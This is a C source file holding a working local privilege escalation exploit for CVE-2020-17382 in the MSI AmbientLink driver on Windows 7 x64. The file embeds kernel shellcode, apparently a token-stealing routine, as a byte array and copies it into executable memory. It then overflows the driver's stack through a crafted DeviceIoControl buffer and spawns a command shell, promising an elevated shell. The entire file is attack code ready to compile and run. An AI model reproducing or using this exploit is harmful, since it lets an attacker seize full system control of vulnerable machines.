#include "exploit.h"

unsigned char assembly[] =
{
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x48, 0x89, 0xC3, 0x48, 0x8B, 0x9B, 0x88, 0x01, 0x00, 0x00, 0x48, 0x81, 0xEB, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x8B, 0x80, 0x01, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x8B, 0x8B, 0x08, 0x02, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0x08, 0x02, 0x00, 0x00, 0xC3
};
int main(int argc, char** argv)
{
	// Preparation Stage Stack Variables
	void* h_driver = CreateFileA(VULNERABLE_DEVICE_DRIVER, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	void* payload = (void*)0;
	unsigned char unused = 0;

	// Exploitation Stage Stack Variables
	unsigned char output[256] = { 0 };
	unsigned char input[104] = { 0 };
	unsigned long bytes_returned = 0;

	RtlSecureZeroMemory(input, sizeof(input));
	RtlSecureZeroMemory(output, sizeof(output));

	SetConsoleTitleA("CVE-2020-17382");
	printf("[*] MSI AmbientLink Stack-based Buffer Overflow Local Privilege Escalation Vulnerability\n[*] This exploit was written for Windows 7 SP1 x64\n[*] Exploit written by Niko\n[*] Let's exploit!\n");

	if (h_driver == (void*)-1)
	{
		printf("\n[-] Failed to obtain a handle to the vulnerable device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the vulnerable device driver. Device Driver Handle Value: 0x%p", h_driver);

	payload = VirtualAlloc(0, sizeof(assembly), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!payload)
	{
		printf("\n[-] Failed to allocate memory for the kernel payload. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated memory for the kernel payload. Kernel Payload Address: 0x%p", payload);

	memcpy(payload, assembly, sizeof(assembly));
	printf("\n[+] Prepared the kernel payload allocation.");

	memset(input, 'A', 96);
	*(unsigned long long*)(input + 96) = (unsigned long long*)payload;
	printf("\n[+] Crafted the special input buffer.");

	for (int i = 3; i > 0; i--)
	{
		printf("\n[!] Triggering kernel memory corruption in %d...", i);
		Sleep(1000);
	}
	DeviceIoControl(h_driver, VULNERABLE_FUNCTION_IOCTL, input, sizeof(input), output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Triggered kernel stack-based buffer overflow.\n\n[+] Kernel exploitation completed successfully. Enjoy your new shell!");

	system("start C:\\Windows\\System32\\cmd.exe");
	unused = getchar();
	return 0;
}